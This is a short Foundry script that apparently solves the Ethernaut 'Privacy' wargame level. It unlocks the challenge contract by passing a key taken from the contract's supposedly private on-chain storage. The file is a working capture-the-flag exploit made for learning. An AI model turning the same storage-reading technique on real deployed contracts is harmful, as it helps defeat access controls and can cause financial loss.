//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Privacy}  from "src/ethernaut12.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut10Script is Script{
    Privacy instance = Privacy(0xB97E09d0c13F01E6CC899Fd46d7f147810669A36);

    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes16 key = bytes16(bytes32(0x8a12f9eb34e2661bf5cb846f0a890893d161ffbf2facc49b726f33cd3ee1f86d));
        instance.unlock(key);
        console.log(instance.locked());
    
        vm.stopBroadcast();
    }
}
